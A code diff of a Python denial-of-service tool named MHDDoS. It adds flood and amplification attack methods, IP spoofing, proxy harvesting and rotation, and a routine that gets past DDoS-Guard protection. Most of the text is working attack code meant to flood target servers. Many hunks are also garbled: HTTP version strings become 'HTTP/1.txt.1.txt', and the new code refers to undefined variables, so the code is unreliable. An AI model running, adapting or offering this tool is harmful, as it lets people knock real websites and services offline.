@@ -1,30 +1,475 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+
 import json
-from concurrent.futures import ThreadPoolExecutor
+import socket
+import sys
+import time
+import random
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from itertools import cycle
+from logging import basicConfig, getLogger, shutdown
+from math import log2, trunc
+from multiprocessing import RawValue
+from os import urandom as randbytes
+from pathlib import Path
+from re import compile
+from random import choice as randchoice
+from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
+                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
+                    gethostname, socket)
+from ssl import CERT_NONE, SSLContext, create_default_context
+from struct import pack as data_pack
+from subprocess import run, PIPE
+from sys import argv
+from sys import exit as _exit
+from threading import Event, Thread
+from time import sleep, time
+from typing import Any, List, Set, Tuple
+from urllib import parse
+from uuid import UUID, uuid4
 
-l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE",
-      "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
-l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]
-l3 = ["POD", "ICMP"]
-to = ["CFIP", "DNS", "PING", "CHECK", "DSTAT", "INFO"]
-ot = ["STOP", "TOOLS", "HELP"]
-methods = l7 + l4 + l3
-methodsl = l7 + l4 + l3 + to + ot
+from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
+from PyRoxy import Tools as ProxyTools
+from certifi import where
+from cloudscraper import create_scraper
+from dns import resolver
+from icmplib import ping
+from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
+from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
+from requests import Response, Session, exceptions, get, cookies
+from yarl import URL
+from base64 import b64encode
+
+basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
+            datefmt="%H:%M:%S")
+logger = getLogger("MHDDoS")
+logger.setLevel("INFO")
+ctx: SSLContext = create_default_context(cafile=where())
+ctx.check_hostname = False
+ctx.verify_mode = CERT_NONE
+
+__version__: str = "2.4 SNAPSHOT"
+__dir__: Path = Path(__file__).parent
+__ip__: Any = None
+tor2webs = [
+    'onion.city',
+    'onion.cab',
+    'onion.direct',
+    'onion.sh',
+    'onion.link',
+    'onion.ws',
+    'onion.pet',
+    'onion.rip',
+    'onion.plus',
+    'onion.top',
+    'onion.si',
+    'onion.ly',
+    'onion.my',
+    'onion.sh',
+    'onion.lu',
+    'onion.casa',
+    'onion.com.de',
+    'onion.foundation',
+    'onion.rodeo',
+    'onion.lat',
+    'tor2web.org',
+    'tor2web.fi',
+    'tor2web.blutmagie.de',
+    'tor2web.to',
+    'tor2web.io',
+    'tor2web.in',
+    'tor2web.it',
+    'tor2web.xyz',
+    'tor2web.su',
+    'darknet.to',
+    's1.tor-gateways.de',
+    's2.tor-gateways.de',
+    's3.tor-gateways.de',
+    's4.tor-gateways.de',
+    's5.tor-gateways.de'
+]
+
+with open(__dir__ / "config.json") as f:
+    con = json.load(f)
+
+with socket(AF_INET, SOCK_DGRAM) as s:
+    s.connect(("8.8.8.8", 80))
+    __ip__ = s.getsockname()[0]
 
 
-def spoofer():
-    addr = [192, 168, 0, 1]
-    d = '.'
-    addr[0] = str(random.randrange(11, 197))
-    addr[1] = str(random.randrange(0, 255))
-    addr[2] = str(random.randrange(0, 255))
-    addr[3] = str(random.randrange(2, 254))
-    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
-    return assemebled
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
 
-def start_attack(method, threads, event, socks_type):
+def exit(*message):
+    if message:
+        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
+    shutdown()
+    _exit(1)
+
+
+class Methods:
+    LAYER7_METHODS: Set[str] = {
+        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
+        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
+    }
+
+    LAYER4_AMP: Set[str] = {
+        "MEM", "NTP", "DNS", "ARD",
+        "CLDAP", "CHAR", "RDP"
+    }
+
+    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
+                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
+                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
+                                "TS3", "MCPE", "ICMP"
+                                }
+
+    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
+
+
+google_agents = [
+    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
+    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
+    "+http://www.google.com/bot.html)) ",
+    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
+    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
+]
+
+
+class Counter:
+    def __init__(self, value=0):
+        self._value = RawValue('i', value)
+
+    def __iadd__(self, value):
+        self._value.value += value
+        return self
+
+    def __int__(self):
+        return self._value.value
+
+    def set(self, value):
+        self._value.value = value
+        return self
+
+
+REQUESTS_SENT = Counter()
+BYTES_SEND = Counter()
+
+
+class Tools:
+    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
+    protocolRex = compile('"protocol":(\d+)')
+
+    @staticmethod
+    def humanbytes(i: int, binary: bool=False, precision: int=2):
+        MULTIPLES = [
+            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
+        ]
+        if i > 0:
+            base = 1024 if binary else 1000
+            multiple = trunc(log2(i) / log2(base))
+            value = i / pow(base, multiple)
+            suffix = MULTIPLES[multiple].format("i" if binary else "")
+            return f"{value:.{precision}f} {suffix}"
+        else:
+            return "-- B"
+
+    @staticmethod
+    def humanformat(num: int, precision: int=2):
+        suffixes = ['', 'k', 'm', 'g', 't', 'p']
+        if num > 999:
+            obje = sum(
+                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
+            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
+        else:
+            return num
+
+    @staticmethod
+    def sizeOfRequest(res: Response) -> int:
+        size: int = len(res.request.method)
+        size += len(res.request.url)
+        size += len('\r\n'.join(f'{key}: {value}'
+                                for key, value in res.request.headers.items()))
+        return size
+
+    @staticmethod
+    def send(sock: socket, packet: bytes):
+        global BYTES_SEND, REQUESTS_SENT
+        if not sock.send(packet):
+            return False
+        BYTES_SEND += len(packet)
+        REQUESTS_SENT += 1
+        return True
+
+    @staticmethod
+    def sendto(sock, packet, target):
+        global BYTES_SEND, REQUESTS_SENT
+        if not sock.sendto(packet, target):
+            return False
+        BYTES_SEND += len(packet)
+        REQUESTS_SENT += 1
+        return True
+
+    @staticmethod
+    def dgb_solver(url, ua, pro=None):
+        s = None
+        idss = None
+        with Session() as s:
+            if pro:
+                s.proxies = pro
+            hdrs = {
+                "User-Agent": ua,
+                "Accept": "text/html",
+                "Accept-Language": "en-US",
+                "Connection": "keep-alive",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-User": "?1",
+                "TE": "trailers",
+                "DNT": "1"
+            }
+            with s.get(url, headers=hdrs) as ss:
+                for key, value in ss.cookies.items():
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+            hdrs = {
+                "User-Agent": ua,
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Referer": url,
+                "Sec-Fetch-Dest": "script",
+                "Sec-Fetch-Mode": "no-cors",
+                "Sec-Fetch-Site": "cross-site"
+            }
+            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
+                for key, value in ss.cookies.items():
+                    if key == '__ddg2':
+                        idss = value
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+
+            hdrs = {
+                "User-Agent": ua,
+                "Accept": "image/webp,*/*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Cache-Control": "no-cache",
+                "Referer": url,
+                "Sec-Fetch-Dest": "script",
+                "Sec-Fetch-Mode": "no-cors",
+                "Sec-Fetch-Site": "cross-site"
+            }
+            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
+                for key, value in ss.cookies.items():
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+                return s
+
+        return False
+
+    @staticmethod
+    def safe_close(sock=None):
+        if sock:
+            sock.close()
+
+
+class Minecraft:
+    @staticmethod
+    def varint(d: int) -> bytes:
+        o = b''
+        while True:
+            b = d & 0x7F
+            d >>= 7
+            o += data_pack("B", b | (0x80 if d > 0 else 0))
+            if d == 0:
+                break
+        return o
+
+    @staticmethod
+    def data(*payload: bytes) -> bytes:
+        payload = b''.join(payload)
+        return Minecraft.varint(len(payload)) + payload
+
+    @staticmethod
+    def short(integer: int) -> bytes:
+        return data_pack('>H', integer)
+
+    @staticmethod
+    def long(integer: int) -> bytes:
+        return data_pack('>q', integer)
+
+    @staticmethod
+    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x00),
+                              Minecraft.varint(version),
+                              Minecraft.data(target[0].encode()),
+                              Minecraft.short(target[1]),
+                              Minecraft.varint(state))
+
+    @staticmethod
+    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x00),
+                              Minecraft.varint(version),
+                              Minecraft.data(
+                                  target[0].encode(),
+                                  b"\x00",
+                                  ip.encode(),
+                                  b"\x00",
+                                  uuid.hex.encode()
+                              ),
+                              Minecraft.short(target[1]),
+                              Minecraft.varint(state))
+
+    @staticmethod
+    def login(protocol: int, username: str) -> bytes:
+        if isinstance(username, str):
+            username = username.encode()
+        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
+                                               0x01 if protocol >= 385 else \
+                                               0x00),
+                              Minecraft.data(username))
+
+    @staticmethod
+    def keepalive(protocol: int, num_id: int) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
+                                               0x10 if protocol >= 712 else \
+                                               0x0F if protocol >= 471 else \
+                                               0x10 if protocol >= 464 else \
+                                               0x0E if protocol >= 389 else \
+                                               0x0C if protocol >= 386 else \
+                                               0x0B if protocol >= 345 else \
+                                               0x0A if protocol >= 343 else \
+                                               0x0B if protocol >= 318 else \
+                                               0x00),
+                              Minecraft.long(num_id) if protocol >= 339 else \
+                              Minecraft.varint(num_id))
+
+    @staticmethod
+    def chat(protocol: int, message: str) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
+                                               0x03 if protocol >= 464 else \
+                                               0x02 if protocol >= 389 else \
+                                               0x01 if protocol >= 343 else \
+                                               0x02 if protocol >= 336 else \
+                                               0x03 if protocol >= 318 else \
+                                               0x02 if protocol >= 107 else \
+                                               0x01),
+                              Minecraft.data(message.encode()))
+
+
+class ProxyManager:
+    @staticmethod
+    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
+        providrs = [
+            provider for provider in cf["proxy-providers"]
+            if provider["type"] == Proxy_type or Proxy_type == 0
+        ]
+        logger.info(
+            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
+                providrs))
+        proxes: Set[Proxy] = set()
+
+        with ThreadPoolExecutor(len(providrs)) as executor:
+            future_to_download = {
+                executor.submit(
+                    ProxyManager.download, provider,
+                    ProxyType.stringToProxyType(str(provider["type"])))
+                for provider in providrs
+            }
+            for future in as_completed(future_to_download):
+                for pro in future.result():
+                    proxes.add(pro)
+        return proxes
+
+    @staticmethod
+    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
+        try:
+            with Session() as session:
+                response = session.get(provider["url"], timeout=provider["timeout"])
+                response.raise_for_status()
+                return ProxyUtiles.parseAllIPPort(response.text.splitlines(), proxy_type)
+        except Exception as e:
+            logger.error(f"Error downloading proxies from {provider['url']}: {e}")
+            return set()
+
+
+class ProxyChecker:
+    @staticmethod
+    def checkAll(proxies: Set[Proxy], timeout: int=5, threads: int=200, url: str="http://httpbin.org/get") -> Set[Proxy]:
+        available = set()
+        with ThreadPoolExecutor(threads) as executor:
+            future_to_check = {executor.submit(ProxyChecker.check, proxy, timeout, url): proxy for proxy in proxies}
+            for future in as_completed(future_to_check):
+                proxy = future_to_check[future]
+                try:
+                    if future.result():
+                        available.add(proxy)
+                except Exception as e:
+                    logger.error(f"Error checking proxy {proxy}: {e}")
+        return available
+
+    @staticmethod
+    def check(proxy: Proxy, timeout: int=5, url: str="http://httpbin.org/get") -> bool:
+        try:
+            with Session() as session:
+                session.proxies.update(proxy.asRequest())
+                response = session.get(url, timeout=timeout)
+                return response.status_code == 200
+        except:
+            return False
+
+
+def handleProxyList(con, proxy_li, proxy_ty, url=None):
+    if proxy_ty not in {4, 5, 1, 0, 6}:
+        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
+    if proxy_ty == 6:
+        proxy_ty = randchoice([4, 5, 1])
+    if not proxy_li.exists():
+        logger.warning(
+            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
+        proxy_li.parent.mkdir(parents=True, exist_ok=True)
+        with proxy_li.open("w") as wr:
+            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
+            logger.info(
+                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
+            )
+            Proxies = ProxyChecker.checkAll(
+                Proxies, timeout=5, threads=threads,
+                url=url.human_repr() if url else "http://httpbin.org/get",
+            )
+
+            if not Proxies:
+                exit(
+                    "Proxy Check failed, Your network may be the problem"
+                    " | The target may not be available."
+                )
+            stringBuilder = ""
+            for proxy in Proxies:
+                stringBuilder += (proxy.__str__() + "\n")
+            wr.write(stringBuilder)
+
+    proxies = ProxyUtiles.readFromFile(proxy_li)
+    if proxies:
+        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
+    else:
+        logger.info(
+            f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
+        proxies = None
+
+    return proxies
+
+
+def start_attack(method, threads, event, socks_type, proxies=None):
     global out_file
     # layer7
     cmethod = str(method.upper())
@@ -148,18 +593,18 @@ def Headers(method):
         header = referer + useragent + accept + connection + "\r\n\r\n"
     elif method == "cookie":
         connection = "Connection: Keep-Alive\r\n"
-        more = "cache-control: no-cache\r\n"
-        parm = "pragma: no-cache\r\n"
-        up = "upgrade-insecure-requests: 1"
-        connection += "Cookies: " + str(secrets.token_urlsafe(16)) + "\r\n"
+        more = "Cache-Control: max-age=0\r\n"
+        more2 = "Via: 1.0.0.0 PROXY\r\n"
+        proxyd = str(proxy)
+        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
         accept = Choice(acceptall) + "\r\n"
         referer = "Referer: " + referers + target + path + "\r\n"
         useragent = "User-Agent: " + UserAgent + "\r\n"
-        header = referer + useragent + accept + connection + more + up + parm + "\r\n\r\n"
+        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
     elif method == "brust":
         connection = "Connection: Keep-Alive\r\n"
         more = "Cache-Control: max-age=0\r\n"
-        more2 = "Via: 1.0 PROXY\r\n"
+        more2 = "Via: 1.0.0.0 PROXY\r\n"
         proxyd = str(proxy)
         xfor = "X-Forwarded-For: " + proxyd + "\r\n"
         accept = "Accept: */*\r\n"
@@ -167,7 +612,7 @@ def Headers(method):
         useragent = "User-Agent: " + UserAgent + "\r\n"
         header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
     elif method == "even":
-        up = "Upgrade-Insecure-Requests: 1\r\n"
+        up = "Upgrade-Insecure-Requests: 1.txt\r\n"
         referer = "Referer: " + referers + target + path + "\r\n"
         useragent = "User-Agent: " + UserAgent + "\r\n"
         proxyd = str(proxy)
@@ -179,11 +624,11 @@ def Headers(method):
         connection = "Cache-Control: max-age=0\r\n"
         connection += "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-        up = "Upgrade-Insecure-Requests: 1\r\n"
+        up = "Upgrade-Insecure-Requests: 1.txt\r\n"
         useragent = "User-Agent: " + UserAgent + "\r\n"
         header = useragent + more + accept + up + "\r\n\r\n"
     elif method == "pps":
-        header = "GET / HTTP/1.1\r\n\r\n"
+        header = "GET / HTTP/1.txt.1.txt\r\n\r\n"
     elif method == "dyn":
         connection = "Connection: Keep-Alive\r\n"
         accept = Choice(acceptall) + "\r\n"
@@ -205,9 +650,9 @@ def Headers(method):
         useragent = "User-Agent: null\r\n"
         header = referer + useragent + accept + connection + "\r\n\r\n"
     elif method == "post":
-        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+        post_host = "POST " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
         content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
-        refer = "Referer: http://" + target + path + "\r\n"
+        referer = "Referer: http://" + target + path + "\r\n"
         user_agent = "User-Agent: " + UserAgent + "\r\n"
         accept = Choice(acceptall) + "\r\n"
         connection = "Cache-Control: max-age=0\r\n"
@@ -215,11 +660,11 @@ def Headers(method):
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         data = str(random._urandom(8))
         length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
-        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
+        header = post_host + accept + connection + referer + content + user_agent + length + "\n" + data + "\r\n\r\n"
     elif method == "hit":
-        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+        post_host = "POST " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
         content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
-        refer = "Referer: http://" + target + path + "\r\n"
+        referer = "Referer: http://" + target + path + "\r\n"
         user_agent = "User-Agent: " + UserAgent + "\r\n"
         connection = "Cache-Control: max-age=0\r\n"
         connection += "pragma: no-cache\r\n"
@@ -227,7 +672,7 @@ def Headers(method):
         accept = Choice(acceptall) + "\r\n"
         data = str(random._urandom(8))
         length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
-        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
+        header = post_host + accept + connection + referer + content + user_agent + length + "\n" + data + "\r\n\r\n"
     return header
 
 
@@ -456,7 +901,7 @@ def stop():
 def dyn(event, socks_type):
     header = Headers("dyn")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + random_data() + "." + target + "\r\n"
+    get_host = "GET " + path + "?" + random_data() + " HTTP/1.txt.1.txt\r\nHost: " + random_data() + "." + target + "\r\n"
 
     request = get_host + header
     event.wait()
@@ -486,7 +931,7 @@ def dyn(event, socks_type):
 def http(event, socks_type):
     header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -515,7 +960,7 @@ def http(event, socks_type):
 def capb(event, socks_type):
     header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -544,7 +989,7 @@ def capb(event, socks_type):
 def ovh(event, socks_type):
     header = Headers("ovh")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "HEAD " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "HEAD " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -601,7 +1046,7 @@ def even(event, socks_type):
     global proxy
     proxy = Choice(proxies).strip().split(":")
     header = Headers("even")
-    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -631,7 +1076,7 @@ def brust(event, socks_type):
     global proxy
     proxy = Choice(proxies).strip().split(":")
     header = Headers("brust")
-    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -660,7 +1105,7 @@ def brust(event, socks_type):
 def cookie(event, socks_type):
     proxy = Choice(proxies).strip().split(":")
     header = Headers("cookie")
-    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -689,7 +1134,7 @@ def cookie(event, socks_type):
 def cfb(event, socks_type):
     header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + "?" + random_data() + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -798,7 +1243,7 @@ def dgb(event, socks_type):
 def head(event, socks_type):
     proxy = Choice(proxies).strip().split(":")
     header = Headers("head")
-    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
     while time.time() < timer:
@@ -827,7 +1272,7 @@ def head(event, socks_type):
 def null(event, socks_type):
     proxy = Choice(proxies).strip().split(":")
     header = Headers("null")
-    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
     while time.time() < timer:
@@ -856,7 +1301,7 @@ def null(event, socks_type):
 def gsb(event, socks_type):
     proxy = Choice(proxies).strip().split(":")
     header = Headers("head")
-    head_host = "HEAD " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    head_host = "HEAD " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
     while time.time() < timer:
@@ -1001,581 +1446,6 @@ t = 0
 
 
 def slow(conn, socks_type):
-    global t
+    header = Headers("dyn")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
-    header = Headers("get")
-    request = get_host + header
-    while time.time() < timer:
-        try:
-            s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-            if socks_type == 5:
-                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
-                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-            s.connect((str(target), int(port)))
-            if protocol == "https":
-                ctx = ssl.SSLContext()
-                s = ctx.wrap_socket(s, server_hostname=target)
-            for _ in range(conn):
-                try:
-                    s.send(request) * conn
-                    t += 1
-                    sys.stdout.write("Connections = " + t + "\r")
-                    sys.stdout.flush()
-                except:
-                    s.close()
-                    proxy = Choice(proxies).strip().split(":")
-        except:
-            s.close()
-            proxy = Choice(proxies).strip().split(":")
-
-
-def checking(lines, socks_type, ms):
-    global nums, proxies
-    global nums, proxies
-    proxy = lines.strip().split(":")
-    if len(proxy) != 2:
-        proxies.remove(lines)
-        return
-    err = 0
-    while True:
-        if err == 3:
-            proxies.remove(lines)
-            break
-        try:
-            s = socks.socksocket()
-            if socks_type == 4:
-                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-            if socks_type == 5:
-                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
-                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-            s.settimeout(ms)
-            s.connect((str(target), int(port)))
-            if protocol == "https":
-                ctx = ssl.SSLContext()
-                s = ctx.wrap_socket(s, server_hostname=target)
-            s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
-            s.close()
-            break
-        except:
-            err += 1
-    nums += 1
-
-
-nums = 0
-
-
-def check_socks(ms):
-    global nums
-    thread_list = []
-    for lines in list(proxies):
-        if choice == "5":
-            th = threading.Thread(target=checking, args=(lines, 5, ms,))
-            th.start()
-        if choice == "4":
-            th = threading.Thread(target=checking, args=(lines, 4, ms,))
-            th.start()
-        if choice == "1":
-            th = threading.Thread(target=checking, args=(lines, 1, ms,))
-            th.start()
-        thread_list.append(th)
-        sleep(0.01)
-    for th in list(thread_list):
-        th.join()
-    ans = "y"
-    if ans == "y" or ans == "":
-        if choice == "4":
-            with open(out_file, 'wb') as fp:
-                for lines in list(proxies):
-                    fp.write(bytes(lines, encoding='utf8'))
-            fp.close()
-        elif choice == "5":
-            with open(out_file, 'wb') as fp:
-                for lines in list(proxies):
-                    fp.write(bytes(lines, encoding='utf8'))
-            fp.close()
-        elif choice == "1":
-            with open(out_file, 'wb') as fp:
-                for lines in list(proxies):
-                    fp.write(bytes(lines, encoding='utf8'))
-            fp.close()
-
-
-def check_list(socks_file):
-    temp = open(socks_file).readlines()
-    temp_list = []
-    for i in temp:
-        if i not in temp_list:
-            if ':' in i:
-                temp_list.append(i)
-    rfile = open(socks_file, "wb")
-    for i in list(temp_list):
-        rfile.write(bytes(i, encoding='utf-8'))
-    rfile.close()
-
-
-def downloadsocks(choice, json_file="socks_urls.json"):
-    global out_file
-    if choice == "4":
-        sock_type = "socks4"
-    elif choice == "5":
-        sock_type = "socks5"
-    elif choice == "1":
-        sock_type = "http"
-    else:
-        print("Invalid socks type")
-        return
-
-    try:
-        with open(json_file, 'r') as f:
-            socks_urls = json.load(f)
-        urls = socks_urls.get(sock_type, [])
-    except (FileNotFoundError, json.JSONDecodeError):
-        print(f"Error reading JSON file: {json_file}")
-        return
-
-    if not urls:
-        print(f"No URLs found for {sock_type}")
-        return
-
-    # 使用多线程下载
-    def download_url(url):
-        try:
-            response = requests.get(url, timeout=5)
-            if response.status_code == 200:
-                return response.text
-            else:
-                print(f"Failed to download from {url}: Status code {response.status_code}")
-                return ""
-        except Exception as e:
-            print(f"Failed to download from {url}: {e}")
-            return ""
-
-    # 创建线程池
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = [executor.submit(download_url, url) for url in urls]
-        results = []
-        for future in futures:
-            result = future.result()
-            if result:
-                results.append(result)
-
-    # 将所有下载的内容合并并写入文件
-    if results:
-        content = "\n".join(results)
-        with open(out_file, 'w') as f:
-            f.write(content)
-        print(f"Downloaded {len(results)} proxy lists to {out_file}")
-    else:
-        print("No proxy lists downloaded.")
-
-def main():
-    global proxies, multiple, choice, timer, out_file
-    method = str(sys.argv[1]).lower()
-
-    out_file = str("files/proxys/" + sys.argv[5])
-    if not os.path.exists(out_file):
-        makefile(out_file)
-
-    if method == "check":
-        proxydl(out_file, socks_type)
-        exit()
-    if method == "stop":
-        url = str(sys.argv[2]).strip()
-        UrlFixer(url)
-        stop()
-    elif (method == "help") or (method == "h"):
-        usge()
-    elif (method == "check"):
-        pass
-    elif str(method.upper()) not in str(methods):
-        print("method not found")
-        exit()
-    timer = int(time.time()) + int(sys.argv[7])
-    url = str(sys.argv[2]).strip()
-    UrlFixer(url)
-    choice = str(sys.argv[3]).strip()
-    if choice != "4" and choice != "5" and choice != "1":
-        print("Socks Type Not Found [4, 5, 1]")
-        exit()
-    if choice == "4":
-        socks_type = 4
-    elif choice == "1":
-        socks_type = 1
-    else:
-        socks_type = 5
-    threads = int(sys.argv[4])
-    proxies = open(out_file).readlines()
-    if method == "slow":
-        conn = threads
-        proxydl(out_file, socks_type)
-        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],
-                                                                                   len(proxies), str(nums)))
-
-        for _ in range(conn):
-            threading.Thread(target=slow, args=(conn, socks_type), daemon=True).start()
-    else:
-        multiple = str((sys.argv[6]))
-        if multiple == "":
-            multiple = int(100)
-        else:
-            multiple = int(multiple)
-        event = threading.Event()
